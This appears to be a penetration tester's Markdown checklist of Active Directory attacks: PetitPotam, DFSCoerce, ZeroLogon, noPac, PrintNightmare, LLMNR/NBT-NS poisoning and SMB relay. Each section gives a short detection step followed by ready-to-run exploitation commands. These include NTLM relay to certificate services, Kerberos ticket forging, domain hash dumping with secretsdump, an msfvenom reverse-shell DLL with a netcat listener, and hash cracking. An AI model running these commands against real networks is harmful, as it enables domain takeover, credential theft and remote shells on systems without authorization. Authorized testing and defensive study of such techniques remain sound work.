
---

## PETITPOTAM

** DETECT **

- [ ] `nxc smb <ip-range> -u 'username' -p 'password' -M petitpotam`

** EXPLOITATION **
[petitpotam.py](https://github.com/topotam/PetitPotam/blob/main/PetitPotam.py)[impacket](https://github.com/ExAndroidDev/impacket.git)[certipy](https://github.com/ly4k/Certipy)

- [ ] `certipy relay -ca <CA_IP> -template DomainController -target <CA_IP>`

- [ ] `petitpotam.py <attacker-ip> <DC_IP>`

- [ ] `certipy auth -pfx user.pfx -dc-ip <DC_IP>`

- [ ] `export KRB5CCNAME=user.ccache`

- [ ] `secretsdump -k -no-pass domain.local/user$@domain.local`

---
## DFSCOERCE

** DETECT **

- [ ] `nxc smb <ip-range> -u 'username' -p 'password' -M dfscoerce`

** EXPLOITATION **
[impacket](https://github.com/ExAndroidDev/impacket.git)[dfscoerce.py](https://github.com/Wh04m1001/DFSCoerce/blob/main/dfscoerce.py)[gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)

- [ ] `impacket-ntlmrelayx -t http://<ca-name>/certsrv/certrqus.asp -smb2support --adcs --template DomainController`

- [ ] `python3 dfscoerce.py -u 'username' -p 'password' -d <domain> <ntlmrelayx-listener-ip> <DC_IP>` // copy b64 cert to cert.txt

- [ ] `cat cert.txt | base64 -d > cert.pfx`

- [ ] `python3 gettgtpkinit.py domain.local/DC01$ -cert-pfx cert.pfx out.ccache`

- [ ] `KRB5CCNAME=out.ccache python3 /impacket/examples/secretsdump.py -just-dc -user-status -debug -k -no-pass DC01$@domain.local -outputfile secrets.ntds`

---
## ZEROLOGON 

** DETECT **

- [ ] `nxc smb <ip-range> -u 'username' -p 'password' -M zerologon`

** EXPLOITATION **
[cve-2020-1472.py](https://github.com/dirkjanm/CVE-2020-1472.git)
- [ ] `python3 cve-2020-1472-exploit.py <DC_NAME> <DC_IP>`

- [ ] `python3 /impacket/examples/secretsdump.py -just-dc -user-status -debug -k -no-pass DC01$@domain.local -outputfile secrets.ntds`

---
## NOPAC

** DETECT **

- [ ] `nxc smb <ip-range> -u 'username' -p 'password' -M nopac`

** EXPLOITATION **
[nopac](https://github.com/Ridter/noPac)

*GetST*
- [ ] `python noPac.py domain.local/username:'password' -dc-ip <DC_IP>`

*SHELL*
- [ ] `python noPac.py domain.local/username:'password' -dc-ip <DC_IP> -dc-host <hostname> -shell --impersonate administrator` 

*HASHDUMP*
- [ ] `python noPac.py domain.local/username:'password' -dc-ip <DC_IP> -dc-host <hostname> --impersonate administrator -dump`

---
## PRINTNIGHTMARE

** DETECT **
[rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py)

*NXC*
- [ ] `nxc smb <ip-address> -u 'username' -p 'password'  -M printnightmare`


*CHECK OPEN PIPES*
- [ ] `rpcdump.py @<ip-address> | egrep 'MS-RPRN|MS-PAR'` 


** EXPLOITATION **
[msfvenom](https://github.com/rapid7/metasploit-framework/blob/master/msfvenom)[CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare)[printnightmare](https://github.com/ly4k/PrintNightmare)


*CREATE DLL PAYLOAD*
- [ ] `msfvenom -f dll -p windows/x64/shell_reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -o /workspace/smb/remote.dll`


*HOST SMB SHARE*
- [ ] `smbserver.py -smb2support "WHATEVERNAME" /workspace/smb/` 


*LISTENER*
- [ ] `nc -lvnp $LOCAL_PORT`  


*EXPLOIT*
- [ ] `CVE-2021-1675.py $DOMAIN/$USER:$PASSWORD@$TARGET_IP '\\$LOCAL_IP\$SHARE\remote.dll'` 
---
## LLMNR&NBT-NS POISONING 

*LISTENER*
- [ ] `responder -I <interface> -rdw` 

*SHOW HASHES*
- [ ] `john /usr/share/responder/logs/SMB-NTLMv2-SSP-<ip-address>.txt --show`

*CRACK HASHES*
- [ ] `hashcat -m 5600 SMB-NTLMv2-SSP-<ip-address>.txt <wordlist> <ruleset>`

- [ ] `hashcat -m 5600 SMB-NTLMv2-SSP-<ip-address>.txt --show`
---
# SMB RELAY  

*EDIT CONF*
*/usr/share/responder/responder.conf*
- [ ] `SMB = Off`
- [ ] `HTTP = Off`

*RELAY*
- [ ] `sudo responder -I <INTERFACE> -rdw -v`
- [ ] `impacket-ntlmrelayx -tf uplist.txt -smb2support`
---